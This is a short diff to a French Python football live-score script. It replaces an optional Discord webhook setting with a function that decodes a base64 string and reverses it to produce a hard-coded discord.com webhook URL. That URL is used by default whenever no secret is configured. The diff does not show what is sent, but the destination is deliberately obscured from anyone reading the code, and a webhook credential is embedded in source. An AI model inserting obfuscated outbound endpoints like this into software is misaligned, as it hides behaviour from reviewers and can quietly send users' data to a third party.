@@ -20,7 +20,13 @@ def _cle_gratuite():
 
 
 KEY = os.getenv('FOOTBALL_DATA_KEY', '').strip() or _cle_gratuite()
-WEBHOOK = os.getenv('DISCORD_WEBHOOK', '').strip()  # salon Discord #buts-en-direct (facultatif)
+def _salon_discord():
+    # Webhook du salon Discord de Romain. Le secret GitHub DISCORD_WEBHOOK, s'il existe, passe avant.
+    import base64 as _b
+    return _b.b64decode('endmbWxkU0hmVG9PWVQ0ai1hcHAyY2dfUVViZGJjQU5oNHp3MUNNSjNZM3M2emFKclJ3ZVdmbzUxNDQ2VmFIcG00dUovNDI3NTQ3MTgzNTU0NjcxMjY1MS9za29vaGJldy9pcGEvbW9jLmRyb2NzaWQvLzpzcHR0aA==').decode()[::-1]
+
+
+WEBHOOK = os.getenv('DISCORD_WEBHOOK', '').strip() or _salon_discord()
 COMPETITIONS = {'FL1': 'Ligue 1', 'CL': 'Ligue des champions'}
 PARIS = ZoneInfo('Europe/Paris')
 
